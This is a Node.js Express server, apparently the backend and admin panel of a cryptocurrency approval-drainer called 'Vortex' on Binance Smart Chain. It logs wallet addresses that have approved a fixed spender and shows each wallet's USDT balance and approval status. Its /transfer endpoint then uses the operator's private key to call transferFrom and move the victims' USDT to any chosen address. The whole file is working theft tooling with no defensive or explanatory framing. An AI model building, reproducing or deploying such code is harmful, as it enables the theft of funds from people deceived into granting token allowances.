
const express = require("express");
const path = require("path");
const dotenv = require("dotenv");
const { ethers } = require("ethers");
const { MongoClient } = require("mongodb");

dotenv.config();

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

const PRIVATE_KEY = process.env.PRIVATE_KEY;
const MONGO_URI = process.env.MONGO_URI;

const provider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/", {
  name: "binance",
  chainId: 56,
});
const wallet = new ethers.Wallet(PRIVATE_KEY, provider);

const USDT_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function transferFrom(address from, address to, uint amount) returns (bool)"
];
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const SPENDER_ADDRESS = "0x61f6f18fbc3ea4060b5aac3894094d1b3322c63b";
const contract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, wallet);

// MongoDB Client Setup
const client = new MongoClient(MONGO_URI);
let collection;

client.connect().then(() => {
  const db = client.db("vortex_db");
  collection = db.collection("approved_wallets");
  console.log("✅ Connected to MongoDB Atlas");
});

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "admin.html"));
});

app.get("/wallets", async (req, res) => {
  try {
    const walletList = await collection.find().toArray();
    const result = await Promise.all(walletList.map(async (entry) => {
      const addr = entry.wallet;
      const balance = await contract.balanceOf(addr);
      const allowance = await contract.allowance(addr, SPENDER_ADDRESS);
      return {
        wallet: addr,
        balance: ethers.utils.formatUnits(balance, 18),
        approved: allowance.gt(0) ? "✅ YES" : "❌ NO"
      };
    }));
    res.json(result);
  } catch (err) {
    console.error("❌ /wallets error:", err);
    res.status(500).json({ error: "Failed to fetch wallets" });
  }
});

app.post("/log", async (req, res) => {
  const { wallet } = req.body;
  if (!wallet || !wallet.startsWith("0x")) return res.status(400).json({ error: "Invalid wallet" });

  try {
    const exists = await collection.findOne({ wallet });
    if (!exists) {
      await collection.insertOne({ wallet });
    }
    res.json({ success: true });
  } catch (err) {
    console.error("❌ /log error:", err);
    res.status(500).json({ success: false, error: "MongoDB insert failed" });
  }
});

app.post("/transfer", async (req, res) => {
  try {
    const { fromWallet, toWallet, amount } = req.body;
    const tx = await contract.transferFrom(fromWallet, toWallet, ethers.utils.parseUnits(amount, 18));
    await tx.wait();
    res.json({ success: true, hash: tx.hash });
  } catch (err) {
    console.error("❌ Transfer Error:", err);
    res.status(500).json({ success: false, error: err.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ Vortex backend live at http://localhost:${PORT}`);
});
